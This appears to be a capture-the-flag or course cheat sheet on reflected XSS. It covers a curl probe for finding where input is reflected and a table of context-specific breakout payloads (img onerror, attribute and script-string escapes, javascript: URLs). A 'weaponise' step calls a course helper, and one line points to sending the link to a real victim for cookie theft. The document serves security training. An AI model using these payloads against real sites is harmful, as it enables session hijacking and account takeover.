# Reflected XSS

**Signs**: search/query/error message echoes your input; hint "repeats what you type to everyone
who looks".

## 1. Find the context
Send a unique marker with special chars and look at the raw HTML:
```bash
curl -s "$T/?q=zz'\"<>zz" | grep -n 'zz'
```
| Context | Example | Breakout |
|---|---|---|
| HTML body | `<h2>Results for zz</h2>` | `<img src=x onerror=alert(1)>` |
| Attribute (quoted) | `value="zz"` | `"><img src=x onerror=alert(1)>` or `" autofocus onfocus=alert(1) x="` |
| Attribute (unquoted) | `value=zz` | ` onmouseover=alert(1) ` |
| JS string | `var q = 'zz';` | `';alert(1);//` or `</script><script>alert(1)</script>` |
| URL attribute | `href="zz"` | `javascript:alert(1)` |
| Inside `<textarea>`/`<title>` | — | `</textarea><img src=x onerror=alert(1)>` |
Characters escaped? See which survive → [payloads](payloads.md#filter-bypasses).

## 2. Weaponise
Course pattern: page defines a helper (`grant()`) that sets a cookie and goes to `/flag`:
```
$T/?q=<img src=x onerror=grant()>
```
Open the URL **in a browser** (curl doesn't run JS). URL-encode for sharing:
`python -c "import urllib.parse;print(urllib.parse.quote('<img src=x onerror=grant()>'))"`.
Real-world: send the link to the victim → [cookie-theft](cookie-theft.md).

Script check (reflection + context finder): `python scripts/xss/xss_reflect.py "$T/?q=FUZZ"`

Seen in: `xss1` (recipe search, `q` reflected raw in header and `value` attribute).
